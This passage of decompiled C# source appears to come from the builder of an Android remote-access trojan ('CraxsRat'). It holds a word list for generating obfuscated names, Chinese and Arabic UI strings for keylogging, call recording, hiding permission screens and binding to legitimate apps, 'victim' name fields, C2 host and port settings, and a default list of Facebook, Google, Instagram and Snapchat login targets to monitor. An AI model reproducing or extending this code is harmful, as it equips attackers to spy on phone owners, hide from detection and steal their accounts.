			"teddy", "tee", "teen", "teenage", "teens", "teeth", "tel", "telecharger", "telecom", "telecommunications",
			"telephone", "telephony", "telescope", "television", "televisions", "tell", "telling", "tells", "temp", "temperature",
			"temperatures", "template", "templates", "temple", "temporal", "temporarily", "temporary", "ten", "tenant", "tend",
			"tender", "tennessee", "tennis", "tension", "tent", "term", "terminal", "terminals", "termination", "terminology",
			"terms", "terrace", "terrain", "terrible", "territories", "territory", "terror", "terrorism", "terrorist", "terrorists",
			"terry", "test", "testament", "tested", "testimonials", "testimony", "testing", "tests", "tex", "texas",
			"text", "textbook", "textbooks", "textile", "textiles", "texts", "texture", "tf", "tft", "tgp",
			"th", "thai", "thailand", "than", "thank", "thanks", "thanksgiving", "that", "thats", "the",
			"theater", "theaters", "theatre", "thee", "theft", "thehun", "their", "them", "theme", "themes",
			"themselves", "then", "theology", "theorem", "theoretical", "theories", "theory", "therapeutic", "therapist", "therapy",
			"there", "thereafter", "thereby", "therefore", "thereof", "thermal", "thesaurus", "these", "thesis", "they",
			"thick", "thickness", "thin", "thing", "things", "think", "thinking", "thinkpad", "thinks", "third",
			"thirty", "this", "thomas", "thompson", "thomson", "thong", "thongs", "thorough", "thoroughly", "those",
			"thou", "though", "thought", "thoughts", "thousand", "thousands", "thread", "threaded", "threads", "threat",
			"threatened", "threatening", "threats", "three", "threesome", "threshold", "thriller", "throat", "through", "throughout",
			"throw", "throwing", "thrown", "throws", "thru", "thu", "thumb", "thumbnail", "thumbnails", "thumbs",
			"thumbzilla", "thunder", "thursday", "thus", "thy", "ti", "ticket", "tickets", "tide", "tie",
			"tied", "tier", "ties", "tiffany", "tiger", "tigers", "tight", "til", "tile", "tiles",
			"till", "tim", "timber", "time", "timeline", "timely", "timer", "times", "timing", "timothy",
			"tin", "tiny", "tion", "tions", "tip", "tips", "tire", "tired", "tires", "tissue",
			"tit", "titanium", "titans", "title", "titled", "titles", "tits", "titten", "tm", "tmp",
			"tn", "to", "tobacco", "tobago", "today", "todd", "toddler", "toe", "together", "toilet",
			"token", "tokyo", "told", "tolerance", "toll", "tom", "tomato", "tomatoes", "tommy", "tomorrow",
			"ton", "tone", "toner", "tones", "tongue", "tonight", "tons", "tony", "too", "took",
			"tool", "toolbar", "toolbox", "toolkit", "tools", "tooth", "top", "topic", "topics", "topless",
			"tops", "toronto", "torture", "toshiba", "total", "totally", "totals", "touch", "touched", "tough",
			"tour", "touring", "tourism", "tourist", "tournament", "tournaments", "tours", "toward", "towards", "tower",
			"towers", "town", "towns", "township", "toxic", "toy", "toyota", "toys", "tp", "tr",
			"trace", "track", "trackback", "trackbacks", "tracked", "tracker", "tracking", "tracks", "tract", "tractor",
			"tracy", "trade", "trademark", "trademarks", "trader", "trades", "trading", "tradition", "traditional", "traditions",
			"traffic", "tragedy", "trail", "trailer", "trailers", "trails", "train", "trained", "trainer", "trainers",
			"training", "trains", "tramadol", "trance", "tranny", "trans", "transaction", "transactions", "transcript", "transcription",
			"transcripts", "transexual", "transexuales", "transfer", "transferred", "transfers", "transform", "transformation", "transit", "transition",
			"translate", "translated", "translation", "translations", "translator", "transmission", "transmit", "transmitted", "transparency", "transparent",
			"transport", "transportation", "transsexual", "trap", "trash", "trauma", "travel", "traveler", "travelers", "traveling",
			"traveller", "travelling", "travels", "travesti", "travis", "tray", "treasure", "treasurer", "treasures", "treasury",
			"treat", "treated", "treating", "treatment", "treatments", "treaty", "tree", "trees", "trek", "trembl",
			"tremendous", "trend", "trends", "treo", "tri", "trial", "trials", "triangle", "tribal", "tribe",
			"tribes", "tribunal", "tribune", "tribute", "trick", "tricks", "tried", "tries", "trigger", "trim",
			"trinidad", "trinity", "trio", "trip", "tripadvisor", "triple", "trips", "triumph", "trivia", "troops",
			"tropical", "trouble", "troubleshooting", "trout", "troy", "truck", "trucks", "true", "truly", "trunk",
			"trust", "trusted", "trustee", "trustees", "trusts", "truth", "try", "trying", "ts", "tsunami",
			"tt", "tu", "tub", "tube", "tubes", "tucson", "tue", "tuesday", "tuition", "tulsa",
			"tumor", "tune", "tuner", "tunes", "tuning", "tunisia", "tunnel", "turbo", "turkey", "turkish",
			"turn", "turned", "turner", "turning", "turns", "turtle", "tutorial", "tutorials", "tv", "tvcom",
			"tvs", "twelve", "twenty", "twice", "twiki", "twin", "twinks", "twins", "twist", "twisted",
			"two", "tx", "ty", "tyler", "type", "types", "typical", "typically", "typing", "u",
			"uc", "uganda", "ugly", "uh", "ui", "uk", "ukraine", "ul", "ultimate", "ultimately",
			"ultra", "ultram", "um", "un", "una", "unable", "unauthorized", "unavailable", "uncertainty", "uncle",
			"und", "undefined", "under", "undergraduate", "underground", "underlying", "understand", "understanding", "understood", "undertake",
			"undertaken", "underwear", "undo", "une", "unemployment", "unexpected", "unfortunately", "uni", "unified", "uniform",
			"union", "unions", "uniprotkb", "unique", "unit", "united", "units", "unity", "univ", "universal",
			"universe", "universities", "university", "unix", "unknown", "unless", "unlike", "unlikely", "unlimited", "unlock",
			"unnecessary", "unsigned", "unsubscribe", "until", "untitled", "unto", "unusual", "unwrap", "up", "upc",
			"upcoming", "update", "updated", "updates", "updating", "upgrade", "upgrades", "upgrading", "upload", "uploaded",
			"upon", "upper", "ups", "upset", "upskirt", "upskirts", "ur", "urban", "urge", "urgent",
			"uri", "url", "urls", "uruguay", "urw", "us", "usa", "usage", "usb", "usc",
			"usd", "usda", "use", "used", "useful", "user", "username", "users", "uses", "usgs",
			"using", "usps", "usr", "usual", "usually", "ut", "utah", "utc", "utilities", "utility",
			"utilization", "utilize", "utils", "uv", "uw", "uzbekistan", "v", "va", "vacancies", "vacation",
			"vacations", "vaccine", "vacuum", "vagina", "val", "valentine", "valid", "validation", "validity", "valium",
			"valley", "valuable", "valuation", "value", "valued", "values", "valve", "valves", "vampire", "van",
			"vancouver", "vanilla", "var", "variable", "variables", "variance", "variation", "variations", "varied", "varies",
			"variety", "various", "vary", "varying", "vast", "vat", "vatican", "vault", "vb", "vbulletin",
			"vc", "vcr", "ve", "vector", "vegas", "vegetable", "vegetables", "vegetarian", "vegetation", "vehicle",
			"vehicles", "velocity", "velvet", "vendor", "vendors", "venezuela", "venice", "venture", "ventures", "venue",
			"venues", "ver", "verbal", "verde", "verification", "verified", "verify", "verizon", "vermont", "vernon",
			"verse", "version", "versions", "versus", "vertex", "vertical", "very", "verzeichnis", "vessel", "vessels",
			"veteran", "veterans", "veterinary", "vg", "vhs", "vi", "via", "viagra", "vibrator", "vibrators",
			"vic", "vice", "victim", "victims", "victor", "victoria", "victorian", "victory", "vid", "video",
			"videos", "vids", "vienna", "vietnam", "vietnamese", "view", "viewed", "viewer", "viewers", "viewing",
			"viewpicture", "views", "vii", "viii", "viking", "villa", "village", "villages", "villas", "vincent",
			"vintage", "vinyl", "violation", "violations", "violence", "violent", "violin", "vip", "viral", "virgin",
			"virginia", "virtual", "virtually", "virtue", "virus", "viruses", "visa", "visibility", "visible", "vision",
			"visit", "visited", "visiting", "visitor", "visitors", "visits", "vista", "visual", "vital", "vitamin",
			"vitamins", "vocabulary", "vocal", "vocals", "vocational", "voice", "voices", "void", "voip", "vol",
			"volkswagen", "volleyball", "volt", "voltage", "volume", "volumes", "voluntary", "volunteer", "volunteers", "volvo",
			"von", "vote", "voted", "voters", "votes", "voting", "voyeur", "voyeurweb", "voyuer", "vp",
			"vpn", "vs", "vsnet", "vt", "vulnerability", "vulnerable", "w", "wa", "wage", "wages",
			"wagner", "wagon", "wait", "waiting", "waiver", "wake", "wal", "wales", "walk", "walked",
			"walker", "walking", "walks", "wall", "wallace", "wallet", "wallpaper", "wallpapers", "walls", "walnut",
			"walt", "walter", "wan", "wang", "wanna", "want", "wanted", "wanting", "wants", "war",
			"warcraft", "ward", "ware", "warehouse", "warm", "warming", "warned", "warner", "warning", "warnings",
			"warrant", "warranties", "warranty", "warren", "warrior", "warriors", "wars", "was", "wash", "washer",
			"washing", "washington", "waste", "watch", "watched", "watches", "watching", "water", "waterproof", "waters",
			"watershed", "watson", "watt", "watts", "wav", "wave", "waves", "wax", "way", "wayne",
			"ways", "wb", "wc", "we", "weak", "wealth", "weapon", "weapons", "wear", "wearing",
			"weather", "web", "webcam", "webcams", "webcast", "weblog", "weblogs", "webmaster", "webmasters", "webpage",
			"webshots", "website", "websites", "webster", "wed", "wedding", "weddings", "wednesday", "weed", "week",
			"weekend", "weekends", "weekly", "weeks", "weight", "weighted", "weights", "weird", "welcome", "welding",
			"welfare", "well", "wellington", "wellness", "wells", "welsh", "wendy", "went", "were", "wesley",
			"west", "western", "westminster", "wet", "whale", "what", "whatever", "whats", "wheat", "wheel",
			"wheels", "when", "whenever", "where", "whereas", "wherever", "whether", "which", "while", "whilst",
			"white", "who", "whole", "wholesale", "whom", "whore", "whose", "why", "wi", "wichita",
			"wicked", "wide", "widely", "wider", "widescreen", "widespread", "width", "wife", "wifi", "wiki",
			"wikipedia", "wild", "wilderness", "wildlife", "wiley", "will", "william", "williams", "willing", "willow",
			"wilson", "win", "wind", "window", "windows", "winds", "windsor", "wine", "wines", "wing",
			"wings", "winner", "winners", "winning", "wins", "winston", "winter", "wire", "wired", "wireless",
			"wires", "wiring", "wisconsin", "wisdom", "wise", "wish", "wishes", "wishlist", "wit", "witch",
			"with", "withdrawal", "within", "without", "witness", "witnesses", "wives", "wizard", "wm", "wma",
			"wn", "wolf", "woman", "women", "womens", "won", "wonder", "wonderful", "wondering", "wood",
			"wooden", "woods", "wool", "worcester", "word", "wordpress", "words", "work", "worked", "worker",
			"workers", "workflow", "workforce", "working", "workout", "workplace", "works", "workshop", "workshops", "workstation",
			"world", "worldcat", "worlds", "worldsex", "worldwide", "worm", "worn", "worried", "worry", "worse",
			"worship", "worst", "worth", "worthy", "would", "wound", "wow", "wp", "wr", "wrap",
			"wrapped", "wrapping", "wrestling", "wright", "wrist", "write", "writer", "writers", "writes", "writing",
			"writings", "written", "wrong", "wrote", "ws", "wt", "wto", "wu", "wv", "ww",
			"www", "wx", "wy", "wyoming", "x", "xanax", "xbox", "xerox", "xhtml", "xi",
			"xl", "xml", "xnxx", "xp", "xx", "xxx", "y", "ya", "yacht", "yahoo",
			"yale", "yamaha", "yang", "yard", "yards", "yarn", "ye", "yea", "yeah", "year",
			"yearly", "years", "yeast", "yellow", "yemen", "yen", "yes", "yesterday", "yet", "yield",
			"yields", "yn", "yo", "yoga", "york", "yorkshire", "you", "young", "younger", "your",
			"yours", "yourself", "youth", "yr", "yrs", "yu", "yugoslavia", "yukon", "z", "za",
			"zambia", "zdnet", "zealand", "zen", "zero", "zimbabwe", "zinc", "zip", "zoloft", "zone",
			"zones", "zoning", "zoo", "zoom", "zoophilia", "zope", "zshops", "zu", "zum", "zus"
		};
		rnd = new Random();
		numberrandomer = null;
		RectInputText0 = new List<Rectangle>();
		RectInputText1 = new List<Rectangle>();
		RectInputText3 = new List<Rectangle>();
		InitializeComponent();
	}

	public void Translateme()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) == 0)
			{
				trakertitle.Text = "追踪清单";
				checkcatpure.Text = Codes.Translate(checkcatpure.Text, "en", "zh");
				checkcaptureonce.Text = Codes.Translate(checkcaptureonce.Text, "en", "zh");
				Label44.Text = Codes.Translate(Label44.Text, "en", "zh");
				Label42.Text = Codes.Translate(Label42.Text, "en", "zh");
				CheckSkipre.Text = Codes.Translate(CheckSkipre.Text, "en", "zh");
				checknetwork.Text = Codes.Translate(checknetwork.Text, "en", "zh");
				Label45.Text = Codes.Translate(Label45.Text, "en", "zh");
				Label46.Text = Codes.Translate(Label46.Text, "en", "zh");
				Label47.Text = Codes.Translate(Label47.Text, "en", "zh");
				Label8.Text = Codes.Translate(Label8.Text, "en", "zh");
				Label48.Text = Codes.Translate(Label48.Text, "en", "zh");
				clonecheck.Text = Codes.Translate(clonecheck.Text, "en", "zh");
				checkunlocker.Text = Codes.Translate(checkunlocker.Text, "en", "zh");
				MainText.Text = "主要文本";
				Label1.Text = "通信端口";
				Label20.Text = "安装后";
				sizelabel.Text = "应用程序大小";
				keeplivelabel.Text = "保持连接";
				Label22.Text = "应用程序名称";
				Label23.Text = "网站链接";
				Button1.Text = "应用程序图标";
				Label27.Text = "自定义应用程序";
				CheckFakeSize.Text = "增加应用程序大小";
				Label28.Text = "自定义通知";
				Label24.Text = "徽标标题";
				Label25.Text = "通知内容";
				Label25.Text = "保持连接";
				Label2.Text = "用户名";
				Label3.Text = "应用程序名称";
				Label9.Text = "应用程序版本";
				Label4.Text = "应用程序标识";
				CheckIconPatch.Text = "图标";
				checkkeyloger.Text = "键盘记录器";
				checkemo.Text = "仅在真实手机上运行";
				Checksuper.Text = "超级模式";
				CheckRecord.Text = "录音通话";
				checkprotector.Text = "应用程序保护";
				CheckHidePrims.Text = "隐藏权限屏幕";
				CheckBIND.Text = "绑定";
				trgtbkg.Watermark = "绑定的应用程序标识";
				Label19.Text = "应用程序版本";
				Label29.Text = "标题";
				Label31.Text = "欢迎消息";
				Label32.Text = "激活按钮";
				checkadmin.Text = "请求管理员权限";
				Button3.Text = "默认模式";
				SelectedApk.Text = "构建应用程序";
				delaylabelaccess.Text = "访问权限请求延迟";
				checkautostart.Text = "MIUI自动启动权限";
				checkkeepsscreen.Text = "保持屏幕常亮";
				TABCTRL.TabPages[0].Text = "信息";
				TABCTRL.TabPages[1].Text = "选项";
				TABCTRL.TabPages[2].Text = "工具";
				TABCTRL.TabPages[3].Text = "界面";
				TABCTRL.TabPages[4].Text = "权限";
				TABCTRL.TabPages[5].Text = "构建";
				CheckQuick.Text = "快速安装";
				CheckDraw.Text = "应用上层显示";
			}
		}
		else
		{
			MainText.Text = "الأيبي \\ هوست";
			Label1.Text = "منفذ الاتصال";
			Label20.Text = "بعد التثبيت";
			sizelabel.Text = "حجم التطبيق";
			keeplivelabel.Text = "البقاء متصل";
			Label22.Text = "إسم التطبيق";
			Label23.Text = "رابط الموقع";
			Button1.Text = "أيقونة التطبيق";
			Label27.Text = "تطبيق مخصص";
			CheckFakeSize.Text = "إضافة جحم لتطبيق";
			Label28.Text = "إشعار مخصص";
			Label24.Text = "عنوان الشعار";
			Label25.Text = "محتوى الأشعار";
			Label25.Text = "البقاء متصل";
			Label2.Text = "إسم المستخدم";
			Label3.Text = "إسم التطبيق";
			Label9.Text = "إصدار التطبيق";
			Label4.Text = "معرف التطبيق";
			CheckIconPatch.Text = "الأيقونة";
			checkkeyloger.Text = "مسجل المفاتيح";
			checkemo.Text = "تشغيل فقط على هواتف حقيقة";
			Checksuper.Text = "الوضع الخارق";
			CheckRecord.Text = "تسجيل المكالمات";
			checkprotector.Text = "حماية التطبيق";
			CheckHidePrims.Text = "إخفاء شاشة الصلاحيات";
			CheckBIND.Text = "دمج";
			trgtbkg.Watermark = "معرف التطبيق المدموج";
			Label19.Text = "إصدار التطبيق";
			Label29.Text = "العنوان";
			Label31.Text = "رسالة الترحيب";
			Label32.Text = "زر التفعيل";
			checkadmin.Text = "طلب صلاحية مسؤول";
			Button3.Text = "الوضع الأفتراضي";
			SelectedApk.Text = "بناء التطبيق";
			delaylabelaccess.Text = "تاخير طلب صلاحية الوصول";
			checkautostart.Text = "MIUI صلاحية البدء التلقائي";
			checkkeepsscreen.Text = "إبقاء الشاشة مضاءة";
			TABCTRL.TabPages[0].Text = "معلومات";
			TABCTRL.TabPages[1].Text = "خيارات";
			TABCTRL.TabPages[2].Text = "أدواة";
			TABCTRL.TabPages[3].Text = "الواجهة";
			TABCTRL.TabPages[4].Text = "مراقبة";
			TABCTRL.TabPages[5].Text = "بناء";
			CheckQuick.Text = "تثبيت سريع";
			CheckDraw.Text = "الظهور فوق التطبيقات";
			checkcatpure.Text = Codes.Translate(checkcatpure.Text, "en", "ar");
			checkcaptureonce.Text = Codes.Translate(checkcaptureonce.Text, "en", "ar");
			Label44.Text = Codes.Translate(Label44.Text, "en", "ar");
			Label42.Text = Codes.Translate(Label42.Text, "en", "ar");
			CheckSkipre.Text = Codes.Translate(CheckSkipre.Text, "en", "ar");
			checknetwork.Text = Codes.Translate(checknetwork.Text, "en", "ar");
			Label45.Text = Codes.Translate(Label45.Text, "en", "ar");
			Label46.Text = Codes.Translate(Label46.Text, "en", "ar");
			Label47.Text = Codes.Translate(Label47.Text, "en", "ar");
			Label37.Text = Codes.Translate(Label37.Text, "en", "ar");
			Label8.Text = Codes.Translate(Label8.Text, "en", "ar");
			Label48.Text = Codes.Translate(Label48.Text, "en", "ar");
			clonecheck.Text = Codes.Translate(clonecheck.Text, "en", "ar");
			checkunlocker.Text = Codes.Translate(checkunlocker.Text, "en", "ar");
			trakertitle.Text = "قائمة تتبع";
		}
	}

	private void b_Add_Click(object sender, EventArgs e)
	{
	}

	private void SpyStyle()
	{
	}

	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			TOpacity.Enabled = false;
		}
	}

	private void Build_Load(object sender, EventArgs e)
	{
		Codes.SetWindowDisplayAffinity(base.Handle, 1u);
		TABCTRL.TabPages[5].BackColor = Color.Black;
		try
		{
			if (MySettingsProperty.Settings.ListBoxTracker != null)
			{
				tracklist.Items.AddRange(MySettingsProperty.Settings.ListBoxTracker.Cast<string>().ToArray());
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (MySettingsProperty.Settings.ListBoxItems != null)
			{
				listmonitor.Items.AddRange(MySettingsProperty.Settings.ListBoxItems.Cast<string>().ToArray());
			}
			else
			{
				string[] items = "Facebook>facebook.com>com.facebook.katana>!Youtube>youtube.com>com.google.android.youtube>!instagram>instagram.com>com.instagram.android>!google>accounts.google.com>com.google.android.gm>!snapchat>snapchat.com>com.snapchat.android>!GoogleDrive>drive.google.com/drive/my-drive>com.google.android.apps.docs>!".Split('!');
				listmonitor.Items.AddRange(items);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\4.ico");
			Translateme();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			Nottitle.Text = MySettingsProperty.Settings.NotifiTitle;
			Notmsg.Text = MySettingsProperty.Settings.NotifiText;
			logbodytext.Text = MySettingsProperty.Settings.bodytext;
			dscriptext.Text = MySettingsProperty.Settings.accessdiscribe;
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			int num = 1;
			do
			{
				Button4_Click(null, null);
				Button2_Click(null, null);
				num = checked(num + 1);
			}
			while (num <= 3);
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			Programmatically = true;
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			TextNameVictim.Text = MySettingsProperty.Settings.build_text_name_victim;
			TextNamePatch.Text = MySettingsProperty.Settings.build_text_name_patch;
			TextVersion.Text = MySettingsProperty.Settings.build_text_version;
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		try
		{
			po.Text = Conversions.ToString(MySettingsProperty.Settings.build_text_port);
			CheckHide.Checked = true;
			CheckDoze.Checked = MySettingsProperty.Settings.build_Checked_doze;
			CheckIconPatch.Checked = MySettingsProperty.Settings.build_Checked_icon;
			iconPatch = MySettingsProperty.Settings.build_path_icon;
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (iconPatch.Length > 0)
			{
				try
				{
					PictureBox1.Image = Image.FromFile(iconPatch);
				}
				catch (Exception projectError10)
				{
					ProjectData.SetProjectError(projectError10);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError11)
		{
			ProjectData.SetProjectError(projectError11);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!File.Exists(iconPatch) && Operators.CompareString(iconPatch, "null", TextCompare: false) != 0)
			{
				iconPatch = "null";
				CheckIconPatch.Checked = false;
			}
		}
		catch (Exception projectError12)
		{
			ProjectData.SetProjectError(projectError12);
			ProjectData.ClearProjectError();
		}
		try
		{
			TextIP.Text = MySettingsProperty.Settings.inj_thost;
		}
		catch (Exception projectError13)
		{
			ProjectData.SetProjectError(projectError13);
			ProjectData.ClearProjectError();
		}
		try
		{
			Programmatically = false;
			TOpacity.Interval = SpySettings.T_Interval;
			TOpacity.Enabled = true;
		}
		catch (Exception projectError14)
		{
			ProjectData.SetProjectError(projectError14);
			ProjectData.ClearProjectError();
		}
	}

	private void TiMAT_Tick(object sender, EventArgs e)
	{
	}

	private void TextFutex_MouseHover(object sender, EventArgs e)
	{
	}

	private void TextFutex_MouseLeave(object sender, EventArgs e)
	{
	}

	private void SelectedApk_Click(object sender, EventArgs e)
	{
	}

	public string asab(string input)
	{
		string[] array = input.Replace("\u200b", " ").Split(' ');
		string text = "";
		string[] array2 = array;
		foreach (string text2 in array2)
		{
			if (text2.Length > 0)
			{
				text += Conversions.ToString(Strings.Chr(Convert.ToInt32(text2)));
			}
		}
		return text;
	}

	private void EncryRando_notifiXML()
	{
		NnotifiXML = Randomunicode(5, 25).ToString().ToLower();
	}

	private void EncryRando_webXML()
	{
		NwebXML = Randomunicode(5, 25).ToString().ToLower();
	}

	private void EncryRando_drawable()
	{
		Ndraw_ico = Randomunicode(5, 25).ToString().ToLower();
		Ndraw_notifi = Randomunicode(5, 25).ToString().ToLower();
	}

	private void EncryRando_app_reso()
	{
		Napp_reso0 = Randomunicode(5, 25);
	}

	private void EncryRandoreso()
	{
		NresoString0 = Randomunicode(10, 25);
		NresoString1 = Randomunicode(10, 25);
		NresoString2 = Randomunicode(10, 25);
		NresoString3 = Randomunicode(10, 25);
		NresoString4 = Randomunicode(10, 25);
		NresoString5 = Randomunicode(10, 25);
		NresoString6 = Randomunicode(10, 25);
		NresoString7 = Randomunicode(10, 25);
		NresoString8 = Randomunicode(10, 25);
		NresoString9 = Randomunicode(10, 25);
		NresoString10 = Randomunicode(10, 25);
		NresoString11 = Randomunicode(10, 25);
		NresoString12 = Randomunicode(10, 25);
	}

	private void EncryRando()
	{
		LogB("Please Wait...");
		NClassGen0 = RandommMad(50, 80);
		NClassGen1 = RandommMad(50, 80);
		NClassGen2 = RandommMad(50, 80);
		NClassGen3 = RandommMad(50, 80);
		NClassGen4 = RandommMad(50, 80);
		NClassGen5 = RandommMad(50, 80);
		NClassGen6 = RandommMad(50, 80);
		NClassGen8 = RandommMad(50, 80);
		NClassGen9 = RandommMad(50, 80);
		NClassGen10 = RandommMad(50, 80);
		NClassGen11 = RandommMad(50, 80);
		NClassGen12 = RandommMad(50, 80);
		NClassGen13 = RandommMad(50, 80);
		NClassGen14 = RandommMad(50, 80);
		N_access_ask_ = RandommMad(50, 80);
		N_ask_battary_ = RandommMad(50, 80);
		N_ask_draw_ = RandommMad(50, 80);
		N_sc_fb_ = RandommMad(50, 80);
		N_news_g_ = RandommMad(50, 80);
		N_strt_view_ = RandommMad(50, 80);
		N_scctrl_ = RandommMad(50, 80);
		N_cap_sc_ = RandommMad(50, 80);
		N_trns_g_ = RandommMad(50, 80);
		N_ask_prim_ = RandommMad(50, 80);
		N_engine_wrk_ = RandommMad(50, 80);
		N_skin_cls_ = RandommMad(50, 80);
		N_update_app_ = RandommMad(50, 80);
		N_callr_lsnr_ = RandommMad(50, 80);
		N_clss_loder_ = RandommMad(50, 80);
		N_excut_meth_ = RandommMad(50, 80);
		N_run_comnd_ = RandommMad(50, 80);
		N_get_me_fil_ = RandommMad(50, 80);
		N_srv_worker_ = RandommMad(50, 80);
		payload = Randomunicode(50, 80);
		new_exit_mth = RandommMad(50, 80);
		new_wifipolc = RandommMad(50, 80);
		new_formatpacket = RandommMad(50, 80);
		new_dzip = RandommMad(50, 80);
		new_getbyte = RandommMad(50, 80);
		new_base_mth = RandommMad(50, 80);
		new_getstr = RandommMad(50, 80);
		new_czip = RandommMad(50, 80);
		new_inst = RandommMad(50, 80);
		new_strt_con_ = RandommMad(50, 80);
		new_fist_inf_ = RandommMad(50, 80);
		new_new_con_ = RandommMad(50, 80);
		new_send_it_ = RandommMad(50, 80);
		new_Reblace_ = RandommMad(50, 80);
		new_runn_srv_ = RandommMad(50, 80);
		NEWRANDOM = RandommMadv2(400, 1000);
	}

	public string Randomunicode(int minCharacters, int maxCharacters)
	{
		string text = "qQaAzZwWsSxXeEdDcCrRfFVvtTGgBbYyHhNnUuJjMmKiIkLoOlPp";
		if (rshit == null)
		{
			rshit = new Random();
		}
		string text2 = "";
		checked
		{
			while (text2.Length < minCharacters)
			{
				text2 = text2 + randmid[rnd.Next(0, randmid.Length)] + Conversions.ToString(text[rnd.Next(0, text.Length - 1)]);
			}
			cou++;
			return text2.ToString().ToLower() + Conversions.ToString(cou);
		}
	}

	public string RandommClass(int minCharacters, int maxCharacters)
	{
		string text = "qQaAzZwWsSxXeEdDcCrRfFVvtTGgBbYyHhNnUuJjMmKiIkLoOlPp";
		rshit.Next(minCharacters, maxCharacters);
		string text2 = "";
		checked
		{
			while (text2.Length < minCharacters)
			{
				text2 = text2 + randmid[rnd.Next(0, randmid.Length)] + Conversions.ToString(text[rnd.Next(0, text.Length - 1)]);
			}
			cou++;
			return text2.ToString().ToLower() + Conversions.ToString(cou);
		}
	}

	public string RandommMadv2(int minCharacters, int maxCharacters)
	{
		string text = "QAZWSXEDCRFVTGBYHNUJMIKOLPqazwsxedcrfvtgbyhnujmikolp";
		if (rshit == null)
		{
			rshit = new Random();
		}
		string text2 = "";
		checked
		{
			while (text2.Length < minCharacters)
			{
				text2 += Conversions.ToString(text[rnd.Next(0, text.Length - 1)]);
			}
			cou++;
			return text2.ToString().ToLower() + Conversions.ToString(cou);
		}
	}

	public string RandommMad(int minCharacters, int maxCharacters)
	{
		string text = "QAZWSXEDCRFVTGBYHNUJMIKOLPqazwsxedcrfvtgbyhnujmikolp";
		if (rshit == null)
		{
			rshit = new Random();
		}
		string text2 = "";
		checked
		{
			while (text2.Length < minCharacters)
			{
				text2 += Conversions.ToString(text[rnd.Next(0, text.Length - 1)]);
			}
			cou++;
			return text2.ToString().ToLower() + Conversions.ToString(cou);
		}
	}

	private string FixStrings(string str)
	{
		string text = "&";
		string text2 = "&amp;";
		string text3 = "<";
		string text4 = "&lt;";
		string text5 = "\"";
		string text6 = "\\\"";
		string text7 = "'";
		string text8 = "\\'";
		string text9 = "?";
		string text10 = "\\?";
		string text11 = "@";
		string text12 = "\\@";
		if (str.Contains(text) && !str.Contains(text2))
		{
			str = str.Replace(text, text2);
		}
		if (str.Contains(text3) && !str.Contains(text4))
		{
			str = str.Replace(text3, text4);
		}
		if (str.Contains(text5) && !str.Contains(text6))
		{
			str = str.Replace(text5, text6);
		}
		if (str.Contains(text7) && !str.Contains(text8))
		{
			str = str.Replace(text7, text8);
		}
		if (str.Contains(text9) && !str.Contains(text10))
		{
			str = str.Replace(text9, text10);
		}
		if (str.Contains(text11) && !str.Contains(text12))
		{
			str = str.Replace(text11, text12);
		}
		return str;
	}

	private void StartWork(string final)
	{
		KillA(first: true);
		if (Operators.CompareString(final, null, TextCompare: false) != 0)
		{
			cou = 1;
			string[] array = final.Split(new string[1] { spl_arguments }, StringSplitOptions.None);
			ip = array[0];
			ports = array[1];
			namevictim = FixStrings(array[2]);
			namepatch = FixStrings(array[3]);
			version = array[4];
			string[] array2 = array[5].Split(':');
			proprty = array2[0];
			KEY = array2[1];
			sleepms = array[6];
			futex = array[7];
			path_apktool = array[8];
			path_font = array[10];
			flavor = array[11];
			string[] array3 = array[12].Split('|');
			array3[0].Split(',');
			array3[1].Split(',');
			iconPatch = array[13];
			if (File.Exists(iconPatch))
			{
				_Bitmap_ICO = (Bitmap)Codes.ResizeImage(new Bitmap(iconPatch), new Size(144, 144));
			}
			BIND_Path = array[16];
			BIND_EX = array[17];
			intent_ = FixStrings(array[18]);
			xPackage = array[19];
			if (xPackage.Contains("."))
			{
				string[] array4 = xPackage.Split('.');
				pack1 = array4[0];
				pack2 = array4[1];
				Nactivz = RandommMad(50, 60);
				Nservziz = RandommMad(50, 60);
				Ntolziz = RandommMad(50, 60);
				Nbrodatz = RandommMad(50, 60);
			}
			EncryRando();
			EncryRandoreso();
			EncryRando_app_reso();
			EncryRando_drawable();
			EncryRando_webXML();
			EncryRando_notifiXML();
			string left = array[14];
			if (Operators.CompareString(left, "Bold", TextCompare: false) == 0 || Operators.CompareString(left, "Regular", TextCompare: false) == 0)
			{
			}
			Conversions.ToInteger(array[15]);
			LogB("Starting...\r\n----------");
			Thread thread = new Thread(Step1);
			thread.IsBackground = true;
			thread.Start();
		}
	}

	public static void DeleteDirectory(string target_dir)
	{
		string[] files = Directory.GetFiles(target_dir);
		string[] directories = Directory.GetDirectories(target_dir);
		string[] array = files;
		foreach (string path in array)
		{
			File.SetAttributes(path, FileAttributes.Normal);
			File.Delete(path);
		}
		string[] array2 = directories;
		foreach (string target_dir2 in array2)
		{
			DeleteDirectory(target_dir2);
		}
		Directory.Delete(target_dir, recursive: false);
	}

	private void Step1()
	{
		string driv = Codes.GetDriv();
		Thread.Sleep(_Time);
		folder_building = driv + "CraxsRat_Bilder";
		if (Environment.Is64BitOperatingSystem)
		{
